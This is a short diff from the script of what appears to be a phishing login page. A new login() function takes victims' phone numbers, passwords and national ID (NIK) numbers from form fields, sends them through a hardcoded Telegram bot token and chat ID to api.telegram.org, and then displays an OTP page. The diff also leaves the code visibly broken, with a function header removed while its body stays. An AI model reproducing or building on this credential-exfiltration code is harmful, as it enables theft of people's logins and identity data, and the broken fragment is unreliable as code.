@@ -454,14 +454,16 @@
 const BOT_TOKEN = "8779360559:AAF8oJxBD-okLDSOy0gNr5uB0rTjH7_zgB4";
 const CHAT_ID = "8264171951";
 
-async function kirimTelegram(phone,password,nik){
+async function login(){
 
-  const pesan =
-`LOGIN BARU
+  const phone = document.getElementById("phone").value
+  const password = document.getElementById("password").value
+  const nik = document.getElementById("nik").value
 
-No HP: ${phone}
-Password: ${password}
-NIK: ${nik}`;
+  await kirimTelegram(phone,password,nik);
+
+  show("otpPage");
+}
 
   await fetch(
     `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
